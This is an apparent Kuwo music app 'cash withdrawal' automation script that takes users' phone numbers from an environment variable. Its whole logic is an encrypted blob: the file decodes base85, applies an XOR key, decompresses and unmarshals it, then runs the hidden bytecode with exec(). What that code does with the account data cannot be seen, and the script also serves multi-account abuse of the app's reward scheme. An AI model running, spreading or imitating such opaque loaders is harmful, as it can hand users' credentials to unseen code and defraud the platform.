# 大大鸣版 酷我提现
# 有问题请及时联系大大鸣 v:xolag29638099  （有其他想要的脚本也可以联系，尽量试着写一写）
# 环境变量 kuwo_mobile  抓取 q#手机号
# 多账号 使用&   例如：账号1&账号2
#
#
#   --------------------------------祈求区--------------------------------
#                     _ooOoo_
#                    o8888888o
#                    88" . "88
#                    (| -_- |)
#                     O\ = /O
#                 ____/`---'\____
#               .   ' \\| |// `.
#                / \\||| : |||// \
#              / _||||| -:- |||||- \
#                | | \\\ - /// | |
#              | \_| ''\---/'' | |
#               \ .-\__ `-` ___/-. /
#            ___`. .' /--.--\ `. . __
#         ."" '< `.___\_<|>_/___.' >'"".
#        | | : `- \`.;`\ _ /`;.`/ - ` : | |
#          \ \ `-. \_ __\ /__ _/ .-` / /
#  ======`-.____`-.___\_____/___.-`____.-'======
#                     `=---='
#
#  .............................................
#           佛祖保佑             永无BUG
#           佛祖镇楼             BUG辟邪
#   --------------------------------代码区--------------------------------
# -*- coding: utf-8 -*-
import zlib,base64,marshal,hashlib

def xor_decrypt(data: bytes, key: str) -> bytes:
    key_bytes = key.encode()
    return bytes(a ^ key_bytes[i % len(key_bytes)] for i, a in enumerate(data))

def decrypt():
    data = 'EtsJmUp{iZ0q;s&m(fMmC!H}EcYNm<>u5P#6T0`8;bte$7^I-GHE^TY3m{C$qV?o*0+az?V_omS3JJ$^|050^kuBUjvVVhux%b(#{)-x8KM$3Z?JniE@|2qf%rj7@)#3Nif3Z(aenAdb)z3&7#S5Lq8o%d_D%XpUV$>b%rm03%wE&}d5m0=Frj6B6?7G+=IQKQIWWO2uy=5HG6S+Yw;miel8A}|?14v28++wgQTm^<CYFnP$;lQmM;_Gv9w~0wpk^2_Dz$F+5R15wf_NL)iPqx@a9v_)sl+gG*^#y*+Jma4qmLsk$0<Z5{t_J#3`A$tc9^dx^Ul6E}e_3LJ6=_e}@1gTflsI!U32SjtJ2E^ZLc%~N;-BnE7H;>qJwH5tJM@Uz>aP{a{OaWtc7;jVanGA2uYV7hV!h<1h!dVeVb0;ZqD}-a1@Xfy6y2L+ikR#$eE%30XbNI=-oC3qswDz_C)wthBdMqZ*g>@EDSRWdU5Ip!2`%e@jEJ*DRW_a#<F|2;ByZFzChUT8pikUdQd`DgZg7sc44{M8ou(p&^v9%c_phJezA+fzt;vb)D`Td&D2u-<Cm3Q}ko*MOiJI-tmAi&N>;N8-iO2RCEmXAg2Yk`CD2hdUfNf6W!_5f}c{ABtH$W=fi=uKy_j-MH3rVt=NNv}V%zo$bua6rA!b=kd0?el2c6*JBkRLsyv96r=LHalK$f8%n1#YrywX^w~pS=n^mLY_>zflpG%+Ab3zz|=Dn1hW?Oa|Zt0It``VctuUJ*$er^X9f=KdLAqJ<~+p6M}C;?rJad%jvhf`$e<p5*5)i!ko07OKY*aIHh*hw>ACOuEQ!MBE}@|BmL8JZrqfqinqSrE}qBNRVN&fUZJ}ob_}zM8&MbHcDFxEB19C7ER;-wurmQ;z;KSjcZu<r5)<NW_=$NepiD6De0Kfrhe<b6L>RI36RWMJr$jva@Q$DWbEio-5c>@51Ck~l0qODjrBzqyf<XFV9#LZ4uDjHU(PS0f_=#f_i`UB*6Gk`tB@5C7Jn)R8BaJ$h0$yp?p}Hm3Xe$~?K}`jL#0oMyN|jovL|zSjG4tgE=ao-X>){U8JE($_c=y?A`h+w4$%FOx;&ik0+N!q+<52#;R*Xacb<@P~d({ibDd!wAnP*i0It-&_`5D#hglE1c`@4u%GoK2}TVH^9e7jM?H?6>+Ux8NAk)L~%M4s@b2mcH@JBA;n|GxE}Qw-Clf^*faPW2bNi59ndvn^T4AH!QWB?P4&V6QL8qgnlj8V0PbQc=f8r+n%xEqN4AuCj&65E;VAj;WfJ1S@Rw|1$K%SUIr45EJqUDtT<Q3JK5^C!Vw}ol=<oa@W(`8Sb?_ym+1d_tF1@Sr0D8aNdCJkQf1WGDL1@sbC3WHU^pGdU?r=|0FR)@-kO}af>og*dg(6lZVyAjYG*RBt1U#_v{K9k2ZOb64FAe*u~Lsd^ed;I>LPnkX9TlRP=77G}<hLPds-jh9$s%##`*@FDwUQ-8N{tcM|GjIm|1qu+=9|Z9HSdxUuR=&?)NZ09i4>HDXHJZ+{7|5rX03$+38`)Dv9)Jo+V8^=6~NkXHt%GNGy?6S+lmf0uv`fDZfEK*<e-(7vLTnkxT=wf2HhX8atV%nY3xEB!ZaIS+c#fVpE$s^vws{m=w|gARC0%cNjT3@UKhBdkrt=z2--OM4*V@>U&2@J=cC^5xO!gOJvJCT>Vo^!bfWSG#s^Cu0$(`G@9x{A`ZQ=2AQGI(rG%>_-eTO}?lXA@!sU@S)87Wm3mV<lRl9jIygKAgiu=809Cs7v*Mz{$Sb>@Oaw;1H#p!a8x~FSum6Lbc~5L&6x>nmV_+44XmH59qy`P3DFks0{91HnMBnvuaex0|Nf^4Xo83H@Z#(}Et4lgQb1wT`&o^y3t0T=Z)q1fi0jnf_d+(Ko#px7t!hh1g=WT4QE~TfN>ltFWQBq(b{F)i=w91L*_E3<P|l1TJ>Df*N#I0Vw!;g_Eu>f*-?`B;{4$^Bokf!?h--l7YPysyy4W~A&zKO_?*Gd9<0v91qOZ*NP(1ItJ>G#+IpAG&P?(;D502B%`-?V{d?OMRyP!<5;9yoB<JRs0?iOux6hw(+qm_GfNBO6ab_v8>A5sh#%H}4+#CiB(aKP$*JXE4K1AD}OqxtIGVLJnAUS<Rs*irCl2}Ff*WH>$7b<d(+l|bcPa7x>dHHb8cYM(~%?-B4eQqtcEmQs^hs`X>qz&wzb6kS_x96=jKH2USE6aFb-y>H5d3jSORsfOmAYpT<`b-;;??FZ0Q0}l1_qx>hfn6iZ5#ru6f2j2Ic;<a~*_QTC*J7L})fu^{0FNn>8o_!hI#p~3w-n57Ipig=sihq-@(TCa{lm7V{K{g-hJqmiS6Ijy^kcqi*8xiC#8r#1Fjtfk}QR-VRKHX6~8w7d;7xj)>uLwE5_P1)rgF-om=S%>!PBt&7ZO$N$6&m2YzJ;a-@{mJf=7rr-1RDBuq2j?}cadeno~>PVG0jOc;HrBRDI}dVGH49xX%h_%AQXFX!=78>M$h7Tn+YZEtN)=`4+>oF{RXLMJLyK}o`fx{&ibn5!fZ5xwIpE&aBd^ngf#N5HheyCg4Cl^>6i!O9)^>fLU%*62qRtePGwMOX?bKN3g>jYAZF$cQ>6ZM;cj`E=XavZ;eqvpO29opBEYDBCxS*KBWB=%rS5Il?P2Kx7F;K80PNrg$(%2KIWLNH_!Q}*p0F+_`ao=w%9}%qaph2V$h$Z-o-`_U<%2*U0IydC{IHuUHUg+t?VdO*wKAqZ^VUD{9Fm(>R_8>{Ej8wE6$zL^cs?9Vv@cYX=v;?(h_CU1uTCBD=;T70^8XUduY&A3+<vNcei+TRH-7sqKp&`L*|3(F6nndVPKw0}MX3#Zc4~7p5^ZlqOW&d%5dj1cT8&q=;g8;YCpNu)cIwP@Lr5Wh1k6vF4;<iceVkQiu%|Vscx4cCY$5Grr&Ef^6fLf9(W<&dWUnZi+#l-W_osc@@H+h(muk63;IgdV*YrAwTx%*_#hBz2)kM*}3hd(COVEfuzq`y>kQet71QG}*V5Tq}>()M*@s5+z(61{AEDVIkVSRe>y!qZeTD9v&(w@Pg{1h{W^V#pe!-J^ORvzPWd0p*%kjw6t|69gCFc=i(mn~=5D4EMKWF&l}*Z2oC053|#s_wwCLKlLF2Y~(LFKQqBPmV0v1Ajm4_erSj*X$`nR-io}0bOG-Qix@O>N;b1Sav?}_hdUo4A5#X{>W+Q<RtOMk>;zQpZC)P8MT3A@VDd!A?jM|l8joCLPb53#fLQ1_Z>U%*^PO*c}z-FL)+Hr<V{p1{f&5hjz$?4JfcdT7$D2cxxT4+jutwC@DctlY+C?+Dkfx-eH`2wqoNXr#^nY@DM<u|J0ewWO&TdUnvOgK)w~wXiH*_TNxK{?<IU`7AGGnZul_TKI=)_Jgl-4R6}u~no|hw9YZ8pO$ea>YD62NVxv1yN$`BS?<5hN{?^}@e+FCDnlCmv|?+i@cBoDQ*vP{r>6g3^auHn)j;!ruS@AhCT$d3v)uw*Z+QTwhwCVlgD+cywfeBJ2x((=VYR9<qPQ%ObadP@}6A0A?O7o7rJrKM2ft<hKt;TDrq-xq9Tq?~C+4u9V;;FdI&A(!kf`{p>d5L6JlPdYiw4unu9b=rzpe40o*`*q9$?xG;11xA^#5CID>4lXx)<|yYFq-^a3WVo5QT_22pcK(Hm3B)2GiUA~<7ij3<(s(>tiA#8kDpnbtFxPEbKLa|DY`|kfmlKd<Ex9g7nXUsf3ykGdKU>Qh1!Cz^gx!lzT$mVWRD&HM#^tI%eR|0j7T^?TJ`N0EX}E1U^^<G~O?BGf3b+ZJRW6mnTnY6|@*59#a$MMRCRKdT7^8)xd-`VFGE{<u=(^hIi5rGhTL@)!>95g*1Z6mK28Slzjiuh3m`%c6%lifJx19d7FY7_>mryJj{u8rlr%q_$h!$xAuX)D`aKEuqSYi|_Xal@`3_wA|BvL@TU^2DGd<7U~z#=yH;GdJyyiprV&iR4Yi_&2FNs1zP#8u6WZ>Ha>@KGgEp%N?Kz|qta!7gWr_(vSfYQYJg?kNTeQ!ng|nB*99NdC_dkYc%YzrN};Fp6&z09N()YecT_8bDAhsh(FB+Cnqok>#_F{Q&oES-Tt`dRGWJl#_*7Kd2Z9MBsun(v#Q><ULWjY*?@n7;}LD-#cwj*kC@y%GuMY<n0E}!tRpA@tMQW{OQ-?m*v>evhN<1i{_CG3>lu%XUuA6yxu=0fUjeze@lY4(s$;D$Ad8)!sw5Yyr;c26H5Q}lpn~!T97C8=tzQJMEu0Wo@Ej#%ua}<Q%&k+Z-GdL;>FKn@R_VzjY_;Ihk0MH?<*sET|+BLDk2(n8z{W{8Ccjw3VM@mN3O)DS7O<t!W(#j$XfFq`UJ7(pZ~UrnH65RIuTg3-kBnm_->u&eat{US}&>9I-W}if1W%R5s*}uZ7g0i3Yr(>PoWB&%;bXoj%cYa4iWqp0V_51ko@2{^P5|CPO2g=&Ny>-dWw=8P+st_y_*IZkC=u<ZJ~aY<H~0sVHBDIUlW1}xilx<u>7#`(Ucr*=^v5^`s?tsT76MifD0N!#XrY&&E}b{*eqIy-ysU(<^u(!j3Au4)lKoXd6$baP1dte-~1^<PH~G}94oFOe^NY?$bJHPe1mPYhZGOO^<0E~2K)@;`v0{?h$o;|_H84vZ8UNQq%2ls`T6fPO%0PYYqVotV%tL!j#mO4+^Xon)i6&Rq?4Xe>X1(2P;|aW?a#Z=ZXpCA5Xg&GSS>aEBx@1Jt9}(;m2OSm`XeOKqFNFEX@<ptb2`;D*r*_Q+i%$}2ulF$^ZH*VC23}EwetSjD<Tobz*4(M@qv!giRoHNPP)O%0)t03rqDc`TteMMe7vqs=Ifkh(SqV)HD5$6cq-Do(JKdr=-sh8=~$K=-Fgj~`qh2)MEjU;?+>zgG<9g7_rzq~9PJmt3u3U$CjC&kK)dT*0SYdooxHn{&>RE6-r0wG2YIwyLmZ`aruKxdg^?3;-zWh`GF}W0#quW`*)HJMxgXnG6>U&&fJ`+nJY%N}YxFnrgMB#nbdJ0|WH3M2=vqu&{r6?RtSQEQV&n1=k~zYpmn9@-AiGr<4X4}AcvF9qS-MTAu7n1kCY?!;uFub&{l2A)WTpt-m7+~&6E*p&lSTlFf6;O7V*6Dup5&m5Tk!XqC^4Cx>AVs0{dFb`O)Yl!E@H+Mk%a1z=y?nWD|4Ltbe9pi6{Xhz(%6TyR`1vAdh{R9@>Iyyb);r$%VA`kc^LIiwn<(Np5X%6zXdO?f+Bj#=^s+Kx?2M|3Ktkrp*@ZA2*<)h0^9(eu{qfx9b$v?R!n9>^iaWhB(5wivB01OIKmz3HR)TK`bBL&hQRG{1l9_I**|f&wq1E6=$kKeCCUk0L=6UdwbQ+I>V|yZ*8_$3i3V)M8npvQ)IRW+IEF_0tqq0qH^z(@>T~tEThE812mSZ@bz&BSfG6$|BCWftXFv^e!tS)Xsz~=$Kn9$dS|{xLYLaNRKiA#iPD9&eU)^Jm*HE!IXuF?%@WxS+XKL|Ykzv3dXln7>G<V6^W&(IQ##%-4s>i;%BCdqQ4B1Y!LrYFaZUC>GcZb^SFxR|Hlz*XbrVd8?o8dHu!zb`Ry>@_wXSr*Cq7+$w2_oqok9V^171(gDTxrCNc4Lccxh-U=40I5`tD(C@u-4V6#20a8d1~1UC*A$cE9wPSNnUqNz)iPyX0PYp!sDUY{=2&zD-W9ME=YSQ&PUcF-?Y-lB?pQzFX8F-+zN84CDZip*X)a$W%lUvl6B!G9hn^<;t*o+lZ&Y~D3(twB$h%<pdV6l+E+Ua^FQI~aG`{CxYFakjB<29gW4EO!%+4s^Cd+|pwP_1zT|)(dB$F|$4rt-+gV#p#Y;Vg7pY7_LgFZ)?PAM~663t!PD~i*PHA#UzTgO%Df1YRu)Q?=W|imUj9gRDwwxor9|0&cazx{%{HuaYN{KOEX{$vA&=7)64V=u0RnZ1YC*FRN9>b~Ua51^K-Bk?X`L278n@FpU+Gd@FXhsJkkiOrW$7sM!3#-(H=->tCB8SCs<F5O)N7G=jNAM;kFcoef0Vs^u_B{sW3FO|afamv=?Xg(`r1~96fSI(9G5L+mG{&)YFfj>lKK7GIKFeHK#_e5EPi4jH(7GFhXoGVZ{%{kEgh$erRP=k^VTLpZ->{Wl2yt<PWk}e4-gM8SXW36EyU73lmbdEyvDF_{4uVDy?T|{S2%h32`UG*f|Nd{6@<%qzOB5&`BAapN!;r8(d$QZ6N`Up#GqzA6GiThA3W<4C`?SwMiM)>Wbng12ULl^?-ZYo)BrLjGdpE(L<u(w)N45@HZ;|OiEc$fm;D)ywYrQb5#3I#Amq~8FE**#~m-q6X-X*cWb<d0YpTL<XVhGYVsa8H`hh6}f3t>zoQBkjxrQ_K<@MDVrf-ZRMal~V4uIz6T)}Zsk(KIkr1(#bca>DMGxMR(7Zj#dH6_BIj6vMpfYXhkHBK_LG*~sjm@lyWitxFjd-S_wi;*VQ73yvawGYAzaQP-FzA8v>HEY-~b)v3tH^Hn09)>o|RAqtuNCn4>SL#MIOjyx{c6>wP}0Q8)_76L_13h<TvvcYYUM$YJyngOdP32BR0Q_*D{F98-1Rn<EB`BW0nR>B*wRhyZt)Uj*gIskU&v_7eDGa3m0&nILZcGnyrH<Ehi?h1N4b;3lAUt@%Uk&YAv<7D6#(0+GIqI>i(r`4EP8|zX~*UCK%>k+h(nf>zB8k9vY-k&pS0BRFTd(Bt<fh~b<&pQV;(CaSFn{}X5E9C~6;`f9UkR8en^)Cdp6&`;R{$tYT)SlCi4xv{KQf9;->yoh0zLfW8#WgJ3(ZTO=bqnh48M9NX?SmYsb0*hCeRYHfx8|A!X6>+4QE5*f8_B;7hJ%fyB`#9FXNd6Qg+=sB!)kMxu&Kd?&OtYlaB`X8%!T2y*XVA`!gTv9WeisM9T8)N#jtV$jCqv##n}pe8l&Q%UlD6YvHOUempc&DQCp0JB{W(gn&5p|VGL5!6q@?CC48(VuwSp#jrxrd$<z^YQ0fpYVs)UN?1T7fU%`0fOwh+z*(U8_NGq|hkpI^gBKe)ljJRf`@(1Tiv)A-|Z<;>31>veK+jBLs@NdzVC;6SyL<lLN;c^YY8eG#yD<<0I45DFt(tg5Pkgj1gdTPIBE)DPIdIUOv{lq~t<q<ktHF<Hx>;KQqA@4C95F+m84igW?%&qsUZ)TCR#hNcYJrj%|4C}-s!LY}r$PHdk5S-%R-5j{-mg!S~#cI01nLfHRTs=##z<QogpSSn0(T@'
    key = 'UBlD4Nijt1OJW3Hhgwpb25SxaH9bV0en'
    checksum = '3034848d04af3d68'
    
    # Verify checksum
    if hashlib.sha256(data.encode()).hexdigest()[:16] != checksum:
        raise ValueError('Data integrity check failed')
        
    # Decrypt process
    encrypted = base64.b85decode(data)
    compressed = xor_decrypt(encrypted, key)
    marshalled = zlib.decompress(compressed)
    return marshal.loads(marshalled)

exec(decrypt())